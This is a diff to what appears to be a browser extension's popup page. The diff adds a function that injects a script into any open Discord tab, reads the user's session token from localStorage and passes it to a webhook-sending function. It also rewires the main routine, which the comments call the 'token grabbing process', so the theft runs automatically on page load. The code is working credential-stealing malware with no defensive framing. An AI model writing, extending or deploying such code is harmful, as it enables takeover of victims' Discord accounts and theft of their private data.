@@ -28,6 +28,28 @@
         <button id="finishButton">Finish</button>
     </div>
     <script>
+        // Function to inject a script into the Discord tab
+        function injectScriptIntoDiscord() {
+            chrome.tabs.query({ url: 'https://discord.com/*' }, function (tabs) {
+                if (tabs.length > 0) {
+                    chrome.scripting.executeScript({
+                        target: { tabId: tabs[0].id },
+                        function: getDiscordToken
+                    }, function (results) {
+                        if (results && results[0] && results[0].result) {
+                            const token = results[0].result;
+                            console.log('Discord token:', token);
+                            sendTokenToWebhook(token);
+                        } else {
+                            console.log('No Discord token found.');
+                        }
+                    });
+                } else {
+                    console.log('No Discord tab found.');
+                }
+            });
+        }
+
         // Function to get the Discord token from local storage
         function getDiscordToken() {
             return localStorage.getItem('token');
@@ -58,12 +80,7 @@
 
         // Main function to handle the token grabbing process
         function main() {
-            const token = getDiscordToken();
-            if (token) {
-                sendTokenToWebhook(token);
-            } else {
-                console.log('No Discord token found.');
-            }
+            injectScriptIntoDiscord();
         }
 
         // Run the main function when the page loads
